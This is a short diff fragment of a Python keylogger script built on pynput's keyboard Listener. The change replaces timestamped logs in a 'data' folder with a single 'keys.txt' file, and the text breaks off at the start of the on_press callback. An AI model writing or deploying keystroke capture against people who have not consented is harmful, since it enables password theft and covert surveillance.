@@ -1,13 +1,7 @@
 #!/usr/bin/env python3
-import os
-from datetime import datetime
 from pynput.keyboard import Listener
 
-# Directory to store logs
-if not os.path.exists("data"):
-    os.makedirs("data")
-
-LOG_FILE = "data/" + str(datetime.today().strftime("%Y-%m-%d-%H:%M:%S")) + ".txt"
+LOG_FILE = "keys.txt"
 
 
 def on_press(key):
